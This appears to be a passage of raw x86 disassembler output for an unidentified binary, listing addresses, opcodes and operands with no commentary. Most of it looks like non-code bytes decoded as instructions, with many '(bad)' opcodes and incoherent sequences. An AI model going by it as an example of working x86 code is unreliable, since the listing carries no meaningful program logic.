  41e59a:	mov    DWORD PTR [ecx+0x57022989],ecx
  41e5a0:	popa   
  41e5a1:	aad    0xb5
  41e5a3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e5a4:	out    dx,eax
  41e5a5:	sar    DWORD PTR [ecx-0xd43e162],0x2f
  41e5ac:	jne    0x41e5b1
  41e5ae:	rcl    BYTE PTR [ebp+ebx*1+0x4f],1
  41e5b2:	lds    ecx,FWORD PTR [ebx]
  41e5b4:	sub    BYTE PTR [esi-0x6bd162aa],al
  41e5ba:	mov    dh,0x60
  41e5bc:	dec    eax
  41e5bd:	iret   
  41e5be:	shr    DWORD PTR [ecx+0x19408989],0x89
  41e5c5:	mov    DWORD PTR [ecx+0xc0c0c0c],ecx
  41e5cb:	or     al,0xc
  41e5cd:	or     al,0xc
  41e5cf:	or     al,0x4e
  41e5d1:	jb     0x41e626
	...
  41e5db:	add    BYTE PTR [eax],al
  41e5dd:	add    BYTE PTR [esi+0x70],cl
  41e5e0:	imul   eax,DWORD PTR [edi+0x5b],0xd42157ae
  41e5e7:	adc    DWORD PTR [eax],esp
  41e5e9:	cs imul edx,DWORD PTR gs:[eax+0x20],0x652e6f2e
  41e5f2:	jbe    0x41e660
  41e5f4:	and    ch,BYTE PTR [ecx+0x67]
  41e5f7:	bound  ebp,QWORD PTR [esi]
  41e5f9:	outs   dx,BYTE PTR ds:[esi]
  41e5fa:	push   ebx
  41e5fb:	imul   esi,DWORD PTR cs:[edx+0x3d],0x626e6262
  41e603:	and    BYTE PTR gs:[ebx+0x22],dl
  41e607:	ins    DWORD PTR es:[edi],dx
  41e608:	jns    0x41e65d
  41e60a:	jae    0x41e675
  41e60c:	outs   dx,DWORD PTR gs:[esi]
  41e60e:	or     eax,0x2e696163
  41e613:	gs push edi
  41e615:	addr16 jp 0x41e68e
  41e618:	and    BYTE PTR [esi+0x2e],dh
  41e61b:	jb     0x41e68f
  41e61d:	outs   dx,DWORD PTR ds:[esi]
  41e61e:	jo     0x41e682
  41e620:	popa   
  41e621:	ins    BYTE PTR es:[edi],dx
  41e622:	jo     0x41e686
  41e624:	push   ebx
  41e625:	bound  ebp,QWORD PTR cs:[ebp+0x41]
  41e629:	and    BYTE PTR [esi],ch
  41e62b:	je     0x41e65b
  41e62d:	das    
  41e62e:	gs ins DWORD PTR es:[edi],dx
  41e630:	and    BYTE PTR [ebx],bh
  41e632:	call   0xd534b2fe
  41e637:	xchg   DWORD PTR [edx-0x1a6bbd63],eax
  41e63d:	jb     0x41e5ea
  41e63f:	add    BYTE PTR [eax],al
  41e641:	cld    
  41e642:	xchg   ebx,eax
  41e643:	mov    ecx,0x42f6b712
  41e648:	mov    al,ds:0x45ddc674
  41e64d:	mov    al,ds:0x348fe101
  41e652:	lds    ebp,FWORD PTR [edi]
  41e654:	sbb    ch,dh
  41e656:	aas    
  41e657:	pusha  
  41e658:	push   esp
  41e659:	pop    esi
  41e65a:	fst    QWORD PTR [esi]
  41e65c:	pop    esi
  41e65d:	or     BYTE PTR [eax],al
  41e65f:	add    BYTE PTR [ebx-0x63],cl
  41e662:	or     BYTE PTR [eax],al
  41e664:	add    BYTE PTR [ecx],ch
  41e666:	xor    BYTE PTR [ebp+0x0],al
  41e669:	push   edx
  41e66b:	mov    ebp,0x22a06dd1
  41e670:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e671:	push   ebx
  41e672:	inc    ebx
  41e673:	pop    edx
  41e674:	xchg   ebx,eax
  41e675:	and    BYTE PTR [ebp-0x5e6611e4],ch
  41e67b:	and    eax,ebx
  41e67d:	pop    ss
  41e67e:	aam    0xfe
  41e680:	sub    eax,0xffffffff
  41e685:	sbb    al,0xf5
  41e687:	(bad)  
  41e688:	jmp    DWORD PTR [esi+0x7b]
  41e68b:	(bad)  
  41e68c:	(bad)  
  41e68d:	dec    DWORD PTR [ebx-0x74747475]
  41e693:	mov    ecx,DWORD PTR [ebx+0x7e698b8b]
  41e699:	push   0x39
  41e69b:	pushf  
  41e69c:	lea    esp,ds:0x8144be2c
  41e6a2:	pushf  
  41e6a3:	jbe    0x41e6f4
  41e6a5:	push   ss
  41e6a6:	push   edx
  41e6a7:	push   esi
  41e6a8:	mov    es,WORD PTR [esi+0x3c]
  41e6ab:	(bad)
  41e6af:	je     0x41e725
  41e6b1:	je     0x41e727
  41e6b3:	je     0x41e729
  41e6b5:	je     0x41e72b
  41e6b7:	je     0x41e685
  41e6b9:	int3   
  41e6ba:	sub    ah,BYTE PTR [ebp-0x6a]
  41e6bd:	popf   
  41e6be:	int3   
  41e6bf:	int3   
  41e6c0:	mov    bh,BYTE PTR [edi]
  41e6c2:	aas    
  41e6c3:	bound  ebp,QWORD PTR [edi]
  41e6c5:	inc    eax
  41e6c6:	hlt    
  41e6c7:	aaa    
  41e6c8:	jbe    0x41e6f1
  41e6ca:	ins    BYTE PTR es:[edi],dx
  41e6cb:	xor    al,0x68
  41e6cd:	and    ah,BYTE PTR [eax-0x788c50ba]
  41e6d3:	(bad)  
  41e6d4:	and    DWORD PTR [ebp-0x5bfd143],ecx
  41e6da:	mov    ebx,eax
  41e6dc:	mov    edx,0x44141437
  41e6e1:	xchg   esp,eax
  41e6e2:	xlat   BYTE PTR ds:[ebx]
  41e6e3:	int3   
  41e6e4:	int3   
  41e6e5:	in     al,0x1a
  41e6e7:	int3   
  41e6e8:	int3   
  41e6e9:	inc    eax
  41e6ea:	cwde   
  41e6eb:	aas    
  41e6ec:	int3   
  41e6ed:	add    BYTE PTR [edx-0x4c],dl
  41e6f0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e6f1:	retf   
  41e6f2:	sar    ebx,1
  41e6f4:	imul   ecx,DWORD PTR [ebx+0x1215242b],0xf73671f7
  41e6fe:	loop   0x41e759
  41e700:	test   al,0xaa
  41e702:	dec    esp
  41e703:	test   BYTE PTR [ebx+0x78],dl
  41e709:	xor    eax,0x2e13ea16
  41e70e:	jne    0x41e787
  41e710:	sub    eax,0xe3af3f01
  41e715:	jno    0x41e6ff
  41e717:	xchg   DWORD PTR es:[edi-0x8],eax
  41e71b:	test   eax,0x62f6531f
  41e720:	push   es
  41e721:	pop    ecx
  41e722:	mov    esp,0x72bb2f
  41e727:	add    ah,bh
  41e729:	mov    bl,0x7
	...
  41e737:	test   eax,0x3407
  41e73c:	add    BYTE PTR [eax],al
  41e73e:	add    BYTE PTR [eax],al
  41e740:	add    BYTE PTR [eax],al
  41e742:	add    al,ch
  41e744:	call   0xfb18c5b2
  41e749:	and    bl,ah
  41e74b:	div    ch
  41e74d:	push   cs
  41e74e:	adc    eax,0x1ac9fca5
  41e753:	cmp    bh,0x91
  41e756:	jmp    0xc37a:0xa2d2a9c3
  41e75d:	call   0xe876774a
  41e762:	call   0xe929f568
  41e767:	xor    eax,0x5136c84f
  41e76c:	aas    
  41e76d:	aaa    
  41e76e:	jmp    0x4a1a8f91
  41e773:	adc    dl,BYTE PTR [esp+esi*8+0x5e]
  41e777:	fmul   QWORD PTR [eax]
  41e779:	dec    ebx
  41e77a:	ret    
  41e77b:	imul   esp,DWORD PTR [eax+0x45e894f3],0xe46d8255
  41e785:	inc    ebp
  41e786:	inc    ebp
  41e787:	inc    ebp
  41e788:	addr16 mov esp,0xd8d7f5e9
  41e78e:	int    0xc5
  41e790:	dec    esi
  41e791:	cmp    bl,bh
  41e793:	push   ecx
  41e794:	jl     0x41e73e
  41e796:	add    bh,BYTE PTR [ebx-0x55a1e230]
  41e79c:	popa   
  41e79d:	dec    edx
  41e79e:	xchg   esi,eax
  41e79f:	pop    ebp
  41e7a0:	add    eax,0xac58e3df
  41e7a5:	rcr    BYTE PTR [edx+0x28],cl
  41e7a8:	or     eax,0x454542ed
  41e7ad:	idiv   DWORD PTR [eax-0x33bababb]
  41e7b3:	int3   
  41e7b4:	int3   
  41e7b5:	int3   
  41e7b6:	int3   
  41e7b7:	int3   
  41e7b8:	int3   
  41e7b9:	int3   
  41e7ba:	int3   
  41e7bb:	mov    cl,0x14
  41e7bd:	push   ebx
	...
  41e7c6:	add    BYTE PTR [eax],al
  41e7c8:	add    BYTE PTR [eax-0x1683f0bd],bl
  41e7ce:	test   al,0xe2
  41e7d0:	adc    al,0xad
  41e7d2:	pusha  
  41e7d3:	pop    esi
  41e7d4:	out    dx,eax
  41e7d5:	adc    DWORD PTR [ebx+0x74],0xffffff9b
  41e7d9:	out    dx,eax
  41e7da:	sub    BYTE PTR [ebx],ah
  41e7dc:	test   eax,0x807da92c
  41e7e1:	add    BYTE PTR [eax],al
  41e7e3:	ja     0x41e7ca
  41e7e5:	push   eax
  41e7e6:	or     ah,ch
  41e7e8:	sub    eax,0xcde9cb34
  41e7ed:	push   0x39
  41e7ef:	pop    ebp
  41e7f0:	sbb    edx,DWORD PTR [edi-0x33]
  41e7f3:	test   ah,ch
  41e7f5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e7f6:	xor    DWORD PTR [edi*2+0x4bb3c6e7],edx
  41e7fd:	cld    
  41e7fe:	inc    ebp
  41e7ff:	lods   eax,DWORD PTR ds:[esi]
  41e800:	add    BYTE PTR [eax],al
  41e802:	cs add al,0xf8
  41e805:	add    BYTE PTR [eax],al
  41e807:	add    edx,DWORD PTR [ebp-0x33]
  41e80a:	add    BYTE PTR [eax],al
  41e80c:	leave  
  41e80d:	pushf  
  41e80e:	add    al,0x17
  41e810:	xor    DWORD PTR [ecx-0x597f549b],edi
  41e816:	es dec eax
  41e818:	add    BYTE PTR [esp+esi*8+0xa1017a],cl
  41e81f:	sub    BYTE PTR [edx],al
  41e821:	add    esi,DWORD PTR [esi-0x5]
  41e824:	add    BYTE PTR [eax],al
  41e826:	add    BYTE PTR ds:0x440000dc,ah
  41e82c:	into   
  41e82d:	add    BYTE PTR [eax],al
  41e82f:	add    bh,bh
  41e831:	(bad)  
  41e832:	(bad)  
  41e833:	(bad)  
  41e834:	(bad)  
  41e835:	(bad)  
  41e836:	(bad)  
  41e837:	(bad)  
  41e838:	push   DWORD PTR [esi]
  41e83a:	xchg   bl,dh
  41e83c:	xlat   BYTE PTR ds:[ebx]
  41e83d:	xlat   BYTE PTR ds:[ebx]
  41e83e:	xor    DWORD PTR [eax+0x65756770],esi
  41e844:	ds je  0x41e867
  41e847:	dec    ebp
  41e848:	popa   
  41e849:	dec    ebp
  41e84a:	jbe    0x41e89f
  41e84c:	outs   dx,BYTE PTR ds:[esi]
  41e84d:	dec    esp
  41e84e:	bound  esp,QWORD PTR [ebp+0x22]
  41e851:	je     0x41e8a6
  41e853:	ins    BYTE PTR es:[edi],dx
  41e854:	das    
  41e855:	outs   dx,DWORD PTR ds:[esi]
  41e856:	ins    DWORD PTR es:[edi],dx
  41e857:	jb     0x41e887
  41e859:	outs   dx,BYTE PTR ds:[esi]
  41e85a:	arpl   WORD PTR gs:[ebx+0x69],si
  41e85e:	arpl   WORD PTR cs:[ebp+0x20],sp
  41e862:	jo     0x41e8a0
  41e864:	imul   esi,DWORD PTR [ebx+0x72],0x79650d65
  41e86b:	jae    0x41e8d2
  41e86d:	and    BYTE PTR [eiz*2+0x690d2f76],ch
  41e874:	push   edi
  41e875:	outs   dx,DWORD PTR gs:[esi]
  41e877:	or     ah,BYTE PTR [eax]
  41e879:	and    BYTE PTR [ebp+0x20],ch
  41e87c:	cmp    eax,0x4d737220
  41e881:	jb     0x41e8e8
  41e883:	bound  edx,QWORD PTR cs:[ebx+0x76]
  41e887:	inc    esp
  41e888:	inc    ecx
  41e889:	imul   esi,DWORD PTR [edx+0x69],0x72626d57
  41e890:	popa   
  41e891:	or     cl,BYTE PTR ds:[edx]
  41e894:	and    BYTE PTR [eax],ah
  41e896:	bound  ebp,QWORD PTR [esi]
  41e898:	jb     0x41e8ff
  41e89a:	bound  edi,QWORD PTR ds:0x6965764d
  41e8a0:	and    dh,BYTE PTR [ebx+0x2e]
  41e8a3:	ins    DWORD PTR es:[edi],dx
  41e8a4:	and    ch,BYTE PTR [esi]
  41e8a6:	and    BYTE PTR [ebp+0x20],cl
  41e8a9:	and    BYTE PTR [ecx+0x72],bh
  41e8ac:	ds ins DWORD PTR es:[edi],dx
  41e8ae:	and    BYTE PTR [esi-0x46],dl
  41e8b1:	add    DWORD PTR [ecx],0xffffff9c
  41e8b4:	sahf   
  41e8b5:	fidivr DWORD PTR [edx-0x65]
  41e8b8:	xor    eax,0xc2d438a6
  41e8bd:	inc    edx
  41e8be:	xchg   edi,ebp
  41e8c0:	(bad)  
  41e8c1:	(bad)  
  41e8c2:	(bad)  
  41e8c3:	(bad)  
  41e8c4:	(bad)  
  41e8c5:	(bad)  
  41e8c6:	(bad)  
  41e8c7:	(bad)  
  41e8c8:	dec    DWORD PTR [ebp+0x5d91b08d]
  41e8ce:	ja     0x41e85d
  41e8d0:	lea    esp,[eax+0x3e]
  41e8d3:	add    ah,BYTE PTR [esp+edx*1-0x64]
  41e8d7:	sbb    al,0xf2
  41e8d9:	rcl    DWORD PTR [eax-0x60b56ee1],cl
  41e8df:	aam    0x34
  41e8e1:	pop    esp
  41e8e2:	jmp    0x1816baa3
  41e8e7:	mov    ss,WORD PTR [edi-0x709080b2]
  41e8ed:	dec    eax
  41e8ef:	repnz sub ebp,DWORD PTR [eax+0x17]
  41e8f3:	jl     0x41e882
  41e8f5:	(bad)  
  41e8f6:	in     al,0xef
  41e8f8:	lea    ecx,[ebp-0x72bb8ca6]
  41e8fe:	mov    esi,ecx
  41e900:	push   ds
  41e901:	adc    dl,BYTE PTR [ebx]
  41e903:	mov    esp,0xa8beceed
  41e908:	stc    
  41e909:	xor    bl,BYTE PTR [ecx+0x71]
  41e90c:	(bad)  
  41e90d:	loop   0x41e8ea
  41e90f:	adc    DWORD PTR [edx+esi*1-0x711cc807],0x5b
  41e917:	mov    ecx,DWORD PTR [ebx+0x1f6b1a8b]
  41e91d:	cli    
  41e91e:	cs pushf 
  41e920:	fisub  WORD PTR [esi+0x60]
  41e923:	mov    bl,0xfc
  41e925:	mov    dl,0x9a
  41e927:	mov    ecx,0x41211278
  41e92c:	outs   dx,DWORD PTR ds:[esi]
  41e92d:	mov    ebp,0x10f8a870
  41e932:	sub    BYTE PTR [edx-0x74149673],ch
  41e938:	mov    eax,DWORD PTR [ebx]
  41e93a:	out    0x47,al
  41e93c:	mov    ecx,DWORD PTR [ebx+0x6a6a6a8b]
  41e942:	push   0x6a
  41e944:	push   0x6a
  41e946:	push   0x6a
  41e948:	cmp    BYTE PTR [edi+ecx*8],dh
  41e94b:	lea    ecx,[ebp-0x72727273]
  41e951:	lea    ecx,[ebp-0x44afaf73]
  41e957:	sbb    al,0x2f
  41e959:	mov    BYTE PTR [eax+0xf],dl
  41e95c:	outs   dx,BYTE PTR ds:[esi]
  41e95d:	cs cmp ecx,ecx
  41e960:	pop    ebx
  41e961:	stos   BYTE PTR es:[edi],al
  41e962:	cmp    BYTE PTR [edx+0x16],bh
  41e965:	lock into 
  41e967:	cmp    BYTE PTR [esi-0x6faaced0],al
  41e96d:	xchg   ebp,eax
  41e96e:	push   eax
  41e96f:	push   eax
  41e970:	outs   dx,DWORD PTR ds:[si]
  41e972:	push   eax
  41e973:	push   eax
  41e974:	repz xchg edx,eax
  41e976:	push   eax
  41e977:	push   eax
  41e978:	test   eax,0xeb5cee3
  41e97d:	fdiv   QWORD PTR [eax]
  41e97f:	sub    DWORD PTR [edx-0x12],0xffffff84
  41e983:	(bad)  
  41e985:	jno    0x41e9ce
  41e987:	das    
  41e988:	ss loopne 0x41e9f4
  41e98b:	cmc    
  41e98c:	outs   dx,BYTE PTR ds:[si]
  41e98e:	idiv   BYTE PTR [esi+0x50]
  41e991:	add    BYTE PTR [esp+edx*8],dl
  41e994:	pop    ebx
  41e995:	adc    eax,DWORD PTR [eax]
  41e997:	add    BYTE PTR [eax],al
  41e999:	loop   0x41ea04
  41e99b:	aaa    
  41e99c:	mov    al,0x3d
  41e99e:	into   
  41e99f:	push   ebx
  41e9a0:	jp     0x41e9ec
  41e9a2:	fs cmp al,0xf5
  41e9a5:	push   ebx
  41e9a6:	vcvtsi2ss xmm3,xmm3,DWORD PTR [edi-0x1c1baf91]
  41e9ae:	(bad)  
  41e9af:	cld    
  41e9b0:	pop    ds
  41e9b1:	mov    eax,0x81b13523
  41e9b6:	pop    edx
  41e9b7:	jp     0x41ea0e
  41e9b9:	ins    BYTE PTR es:[edi],dx
  41e9ba:	mov    al,0xfb
  41e9bc:	add    BYTE PTR [eax],al
  41e9be:	cmp    eax,0xab
  41e9c3:	or     al,0xc
  41e9c5:	or     al,0xc
  41e9c7:	or     al,0xc
  41e9c9:	or     al,0xc
  41e9cb:	or     al,0xc7
  41e9cd:	or     cl,BYTE PTR [esp+ecx*1+0xc]
  41e9d1:	or     al,0xc
  41e9d3:	or     al,0xc
  41e9d5:	or     al,0xc
  41e9d7:	or     al,0xff
  41e9d9:	dec    ecx
  41e9db:	sbb    eax,0x1d6c10fb
  41e9e0:	into   
  41e9e1:	and    BYTE PTR [eax],ah
  41e9e3:	cmp    al,0x48
  41e9e5:	jmp    0xcebfa15e
  41e9ea:	gs jle 0x41e9bb
  41e9ed:	ficom  DWORD PTR [edi-0xdbe929]
  41e9f3:	(bad)  
  41e9f4:	jg     0x41e98b
  41e9f6:	inc    eax
  41e9f7:	arpl   WORD PTR [eax+0x53],sp
  41e9fa:	pop    ebp
  41e9fb:	inc    eax
  41e9fc:	pop    ss
  41e9fd:	or     DWORD PTR gs:[ebx-0x1210c0d8],0x7c
  41ea05:	sub    DWORD PTR [esi+0x786f3508],esp
  41ea0b:	push   ecx
  41ea0c:	das    
  41ea0d:	push   cs
  41ea0e:	jae    0x41ea4e
  41ea10:	xchg   bh,bh
  41ea12:	jmp    FWORD PTR [edi-0x61]
  41ea15:	outs   dx,DWORD PTR ds:[esi]
  41ea16:	(bad)  
  41ea17:	call   DWORD PTR [ecx+0xff540f]
  41ea1d:	mov    dl,BYTE PTR [ecx+esi*1-0x4]
  41ea21:	xchg   BYTE PTR [edi-0x58],ch
  41ea24:	pusha  
  41ea25:	sbb    DWORD PTR [ecx+ebp*8+0x27],eax
  41ea29:	push   esp
  41ea2a:	stos   DWORD PTR es:[edi],eax
  41ea2b:	jne    0x41e9b1
  41ea2d:	dec    esi
  41ea2e:	int    0xb6
  41ea30:	fcomp  QWORD PTR [ebx+0x8]
  41ea33:	cdq    
  41ea34:	dec    esp
  41ea35:	add    BYTE PTR [eax],al
  41ea37:	add    ch,bh
  41ea39:	bound  eax,QWORD PTR [eax]
  41ea3b:	add    BYTE PTR [esi-0x1a],ah
  41ea3e:	add    BYTE PTR [eax],al
  41ea40:	add    bh,bh
  41ea42:	(bad)  
  41ea43:	(bad)  
  41ea44:	(bad)  
  41ea45:	(bad)  
  41ea46:	(bad)  
  41ea47:	(bad)  
  41ea48:	(bad)  
  41ea49:	dec    ecx
  41ea4b:	sub    ecx,DWORD PTR [ebp+0x77ec83ba]
  41ea51:	mov    al,ds:0x2900c5c5
  41ea56:	sysexit 
  41ea58:	mov    eax,0x374e2aed
  41ea5d:	xchg   esp,eax
  41ea5e:	call   0x4f745b1
  41ea63:	add    al,0x4
  41ea65:	add    al,0x4
  41ea67:	add    al,0x4
  41ea69:	add    al,0x4
  41ea6b:	jne    0x41eae2
  41ea6d:	dec    edi
  41ea6e:	out    dx,al
  41ea6f:	scas   al,BYTE PTR es:[edi]
  41ea70:	test   BYTE PTR [ebp+0x75],dh
  41ea73:	or     al,0x29
  41ea75:	jae    0x41eaf5
  41ea77:	sub    DWORD PTR [edx+edx*2-0x4d8082cf],ebx
  41ea7e:	xor    al,bl
  41ea80:	(bad)  [edx+ecx*8-0x30943ac6]
  41ea87:	(bad)  
  41ea88:	out    0xf3,eax
  41ea8a:	es adc al,0x1f
  41ea8d:	repz xor edx,DWORD PTR [esp+ebx*4]
  41ea91:	std    
  41ea92:	inc    esi
  41ea93:	mov    BYTE PTR [eax],ch
  41ea95:	xor    dh,BYTE PTR [ebp+0x75]
  41ea98:	or     esi,ebx
  41ea9a:	jne    0x41eb11
  41ea9c:	xor    dh,BYTE PTR [ecx-0x56ba8af5]
  41eaa2:	out    dx,eax
  41eaa3:	mov    bl,0x49
  41eaa5:	(bad)  
  41eaa6:	sbb    al,0x19
  41eaa8:	out    0xaf,al
  41eaaa:	ret    
  41eaab:	aam    0x54
  41eaad:	mov    eax,ds:0x16178c6e
  41eab2:	adc    DWORD PTR [ecx-0x77],edi
  41eab5:	adc    eax,edi
  41eab7:	push   cs
  41eab8:	dec    ebx
  41eab9:	inc    ebp
  41eaba:	inc    ebp
  41eabb:	inc    ebp
  41eabc:	xchg   ebp,eax
  41eabd:	mov    WORD PTR [ecx],fs
  41eabf:	daa    
  41eac0:	xchg   edx,eax
  41eac1:	ja     0x41ea77
  41eac3:	xor    ebp,DWORD PTR [ecx]
  41eac5:	in     al,0xdc
  41eac7:	push   edi
  41eac8:	retf   0x5dc0
  41eacb:	or     eax,0xa783a6d7
  41ead0:	and    eax,0xbe70f056
  41ead5:	cmp    DWORD PTR [eax+0x70],ebp
  41ead8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ead9:	inc    ebp
  41eada:	inc    ebp
  41eadb:	dec    eax
  41eadc:	out    dx,eax
  41eadd:	rol    DWORD PTR [ebp+0x45],1
  41eae0:	inc    ebp
  41eae1:	and    al,0x24
  41eae3:	and    al,0x24
  41eae5:	and    al,0x24
  41eae7:	and    al,0x24
  41eae9:	and    al,0xc
  41eaeb:	inc    edi
  41eaec:	pop    esi
	...
  41eaf5:	add    BYTE PTR [eax],al
  41eaf7:	add    BYTE PTR [ebx+0x32],bl
  41eafa:	or     al,BYTE PTR [esi]
  41eafc:	das    
  41eafd:	stos   DWORD PTR es:[edi],eax
  41eafe:	mov    dl,0x8e
  41eb00:	xchg   BYTE PTR [ebx-0xc7d4ea9],al
  41eb06:	je     0x41eb0e
  41eb08:	stc    
  41eb09:	adc    edi,DWORD PTR [esi]
  41eb0b:	mov    BYTE PTR [esi-0x1a],ch
  41eb0e:	sub    bl,al
  41eb10:	add    BYTE PTR [eax],al
  41eb12:	shl    al,cl
  41eb14:	add    BYTE PTR [eax],al
  41eb16:	les    esi,FWORD PTR [eax+eax*1]
  41eb19:	add    BYTE PTR [eax+0x61a90630],ah
  41eb1f:	cwde   
  41eb20:	sub    DWORD PTR [esi-0x4c6ab4fb],ebp
  41eb26:	add    BYTE PTR [ebx+0x6f],ch
  41eb29:	jb     0x41eaef
  41eb2b:	push   0x7c23e701
  41eb30:	xlat   BYTE PTR ds:[ebx]
  41eb31:	les    eax,FWORD PTR [eax]
  41eb33:	add    BYTE PTR [esp+edx*4-0x65],cl
  41eb37:	xor    eax,DWORD PTR [eax]
  41eb39:	add    BYTE PTR [eax],al
  41eb3b:	xlat   BYTE PTR ds:[ebx]
  41eb3c:	test   BYTE PTR [edi],dl
  41eb3e:	mov    esp,0x59cf8e32
  41eb43:	pop    es
  41eb44:	pop    esp
  41eb45:	je     0x41eb44
  41eb47:	(bad)  
  41eb48:	lock stos DWORD PTR es:[edi],eax
  41eb4a:	enter  0x559a,0x86
  41eb4e:	or     esi,DWORD PTR [ebp-0x643cbd00]
  41eb54:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41eb55:	ficomp DWORD PTR [eax]
  41eb57:	and    esi,ebx
  41eb59:	dec    ecx
  41eb5a:	dec    ebx
  41eb5b:	fist   DWORD PTR [eax]
  41eb5d:	cmp    DWORD PTR [eax],eax
  41eb5f:	add    BYTE PTR [edx],ah
  41eb61:	inc    BYTE PTR [eax]
	...
  41eb6b:	add    BYTE PTR [eax],al
  41eb6d:	add    BYTE PTR [eax+esi*4+0x15],bl
  41eb74:	add    BYTE PTR [eax],al
  41eb76:	add    BYTE PTR [eax],al
  41eb78:	add    BYTE PTR [eax],al
  41eb7a:	mov    ecx,DWORD PTR [ebx-0x8b1202f]
  41eb80:	xchg   ch,ch
  41eb82:	rol    BYTE PTR [edi-0x24],1
  41eb85:	ficomp WORD PTR [edi-0x20289b6c]
  41eb8b:	pop    ecx
  41eb8c:	cs popf 
  41eb8e:	mov    dl,0x70
  41eb90:	ss add al,0x4c
  41eb93:	sbb    ecx,DWORD PTR [ebx+0x3c47a18b]
  41eb99:	pop    esi
  41eb9a:	push   esi
  41eb9b:	ja     0x41eb4e
  41eb9d:	das    
  41eb9e:	pop    eax
  41eb9f:	neg    BYTE PTR [eax+ebp*1-0x1378c801]
  41eba6:	fbstp  TBYTE PTR [edx]
  41eba8:	mov    ebp,0x7332920d
  41ebad:	and    DWORD PTR [edi+0x62],edi
  41ebb0:	xlat   BYTE PTR ds:[ebx]
  41ebb1:	mov    dl,BYTE PTR [esi-0x75]
  41ebb4:	mov    ebp,edi
  41ebb6:	sahf   
  41ebb7:	outs   dx,BYTE PTR ds:[esi]
  41ebb8:	mov    ecx,DWORD PTR [ebx-0x74afdb0c]
  41ebbe:	add    BYTE PTR [ebp+0xa213600],dh
  41ebc4:	dec    edi
  41ebc5:	dec    edx
  41ebc6:	sub    BYTE PTR [esi-0x6860d263],bl
  41ebcc:	lahf   
  41ebcd:	loopne 0x41eb8b
  41ebcf:	and    eax,eax
  41ebd1:	pop    eax
  41ebd2:	not    DWORD PTR cs:[ebx-0x79]
  41ebd6:	mov    es,WORD PTR [eax]
  41ebd8:	add    BYTE PTR [eax],al
  41ebda:	mov    esi,0x87000058
  41ebdf:	int    0x0
  41ebe1:	add    BYTE PTR [eax],al
  41ebe3:	test   DWORD PTR [ebp-0x7a7a7a7b],eax
  41ebe9:	test   DWORD PTR [ebp+0x3fca485],eax
  41ebef:	cmp    al,0x63
  41ebf1:	outs   dx,DWORD PTR ds:[esi]
  41ebf2:	outs   dx,BYTE PTR ds:[esi]
  41ebf3:	jae    0x41ec23
  41ebf5:	outs   dx,BYTE PTR ds:[esi]
  41ebf6:	push   edi
  41ebf7:	je     0x41ec5e
  41ebf9:	imul   edx,DWORD PTR [edi+0x44],0x74533d70
  41ec00:	inc    ecx
  41ec01:	outs   dx,DWORD PTR gs:[esi]
  41ec03:	and    BYTE PTR [ebx+0x69],dh
  41ec06:	or     ah,BYTE PTR [ebp+0x3e]
  41ec09:	jo     0x41ec7d
  41ec0b:	jne    0x41ec5a
  41ec0d:	and    BYTE PTR gs:[edx+0x61],dl
  41ec11:	and    BYTE PTR [ebx+0x22],al
  41ec14:	dec    ebp
  41ec15:	cs inc ecx
  41ec17:	ins    BYTE PTR es:[edi],dx
  41ec18:	outs   dx,BYTE PTR gs:[esi]
  41ec1a:	cmp    dh,BYTE PTR [edx+0x63]
  41ec1d:	or     dh,BYTE PTR [ebx+0x6c]
  41ec20:	outs   dx,BYTE PTR ds:[esi]
  41ec21:	or     ah,BYTE PTR gs:[eax]
  41ec24:	data16 je 0x41ec8c
  41ec27:	dec    ebp
  41ec28:	jb     0x41ec93
  41ec2a:	cs jo  0x41ec9a
  41ec2d:	push   edi
  41ec2e:	imul   esi,DWORD PTR [esp+esi*2+0x6f],0x692c3a45
  41ec36:	gs outs dx,DWORD PTR cs:[esi]
  41ec39:	jae    0x41eca0
  41ec3b:	cmp    al,0x20
  41ec3d:	inc    esp
  41ec3e:	gs inc ecx
  41ec40:	arpl   WORD PTR [esi],bp
  41ec42:	jbe    0x41ecb9
  41ec44:	outs   dx,DWORD PTR ds:[esi]
  41ec45:	imul   esi,DWORD PTR gs:[eax+ebp*2+0x22],0x742e6573
  41ec4e:	aam    0x61
  41ec50:	mov    edi,0x7112c2ef
  41ec55:	in     eax,dx
  41ec56:	or     BYTE PTR [ebx+0x7461e21],bh
  41ec5c:	xchg   esp,eax
  41ec5d:	mov    esp,0xdbe32679
  41ec62:	rol    BYTE PTR [eax],cl
	...
  41ec6c:	inc    ebp
  41ec6d:	inc    ebp
  41ec6e:	mov    esi,0x4506b4a2
  41ec73:	inc    ebp
  41ec74:	ret    
  41ec75:	dec    esp
  41ec76:	sahf   
  41ec77:	pop    edi
  41ec78:	mov    al,0x4a
  41ec7a:	sub    esp,edi
  41ec7c:	or     BYTE PTR [esi],bl
  41ec7e:	jecxz  0x41ec77
  41ec80:	mov    ah,0xaf
  41ec82:	sbb    eax,0x2eea06d9
  41ec87:	(bad)  
  41ec88:	int3   
  41ec89:	or     cl,BYTE PTR [eax-0x73]
  41ec8c:	cdq    
  41ec8d:	jmp    0xb64bcd12
  41ec92:	pop    ebp
  41ec93:	jle    0x41ec60
  41ec95:	rol    BYTE PTR ds:0x85474545,cl
  41ec9b:	inc    ebp
  41ec9c:	inc    ebp
  41ec9d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ec9e:	dec    edi
  41ec9f:	cmc    
  41eca0:	inc    ebp
  41eca1:	lea    ebx,[eax]
  41eca3:	and    BYTE PTR es:[ebp+0x7b],ch
  41eca7:	iret   
  41eca8:	cmp    BYTE PTR [edi+0x55d83fb8],ch
  41ecae:	mov    dl,0x52
  41ecb0:	adc    al,0x4
  41ecb2:	dec    ebx
  41ecb3:	xor    eax,0x1ef40926
  41ecb8:	push   ss
  41ecb9:	push   es
  41ecba:	lea    ecx,[ebp+0x7b1dc08d]
  41ecc0:	mov    edi,0x3129cfbb
  41ecc5:	xchg   BYTE PTR [eax+0x3c],bh
  41ecc8:	int    0xfa
  41ecca:	imul   ebx,DWORD PTR [eax],0xfffffff7
  41eccd:	xchg   ebx,eax
  41ecce:	dec    edx
  41eccf:	imul   edx,DWORD PTR [edx+0x32e3997e],0xfa08469a
  41ecd9:	push   eax
  41ecda:	lea    ecx,[ebp-0x7283e003]
  41ece0:	lea    ecx,[ebp+0x74747474]
  41ece6:	je     0x41ed5c
